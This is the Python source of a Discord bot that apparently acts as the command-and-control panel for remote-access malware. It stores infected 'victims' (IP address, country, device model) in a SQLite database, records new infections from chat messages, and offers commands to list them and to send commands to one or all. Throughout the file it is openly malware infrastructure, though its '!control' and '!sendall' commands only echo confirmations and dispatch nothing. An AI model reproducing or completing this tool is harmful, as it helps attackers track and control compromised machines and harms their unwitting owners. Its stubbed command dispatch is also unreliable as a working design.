import discord
from discord.ext import commands
import sqlite3

BOT_TOKEN = "basically copy your token and paste it here"
VICTIMS_DB = "victims.db"

conn = sqlite3.connect(VICTIMS_DB)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id TEXT PRIMARY KEY, ip TEXT, country TEXT, model TEXT)''')
conn.commit()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot online: {bot.user}")

@bot.command()
async def victimsnum(ctx):
    cursor.execute("SELECT COUNT(*) FROM victims")
    count = cursor.fetchone()[0]
    await ctx.send(f"Total victims: {count}")

@bot.command()
async def victims(ctx):
    cursor.execute("SELECT * FROM victims")
    victims = cursor.fetchall()
    if not victims:
        await ctx.send("No victims yet.")
        return
    embed = discord.Embed(title="Victims List", color=0xff0000)
    for victim in victims:
        victim_id, ip, country, model = victim
        embed.add_field(name=f"ID: {victim_id}", value=f"IP: {ip}\nCountry: {country}\nModel: {model}", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def getinfo(ctx, victim_id: str):
    cursor.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
    victim = cursor.fetchone()
    if not victim:
        await ctx.send("Victim not found.")
        return
    victim_id, ip, country, model = victim
    embed = discord.Embed(title=f"Victim Info: {victim_id}", color=0xff0000)
    embed.add_field(name="IP", value=ip, inline=True)
    embed.add_field(name="Country", value=country, inline=True)
    embed.add_field(name="Model", value=model, inline=True)
    await ctx.send(embed=embed)

@bot.command()
async def control(ctx, victim_id: str, *, command: str):
    cursor.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
    if not cursor.fetchone():
        await ctx.send("Victim not found.")
        return
    await ctx.send(f"Command '{command}' sent to {victim_id}.")

@bot.command()
async def sendall(ctx, *, command: str):
    cursor.execute("SELECT id FROM victims")
    victims = cursor.fetchall()
    if not victims:
        await ctx.send("No victims found.")
        return
    for victim in victims:
        victim_id = victim[0]
        await ctx.send(f"Command '{command}' sent to {victim_id}.")

@bot.command()
async def remove(ctx, victim_id: str):
    cursor.execute("DELETE FROM victims WHERE id=?", (victim_id,))
    conn.commit()
    await ctx.send(f"Victim {victim_id} removed.")

@bot.command()
async def clear(ctx):
    cursor.execute("DELETE FROM victims")
    conn.commit()
    await ctx.send("All victims cleared.")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    if "New Victim Connected:" in message.content:
        data_lines = message.content.split("\n")
        victim_id = data_lines[0].split(": ")[1]
        ip = data_lines[1].split(": ")[1]
        country = data_lines[2].split(": ")[1]
        model = data_lines[3].split(": ")[1]
        cursor.execute("INSERT OR REPLACE INTO victims VALUES (?, ?, ?, ?)", (victim_id, ip, country, model))
        conn.commit()
    await bot.process_commands(message)

bot.run(BOT_TOKEN)
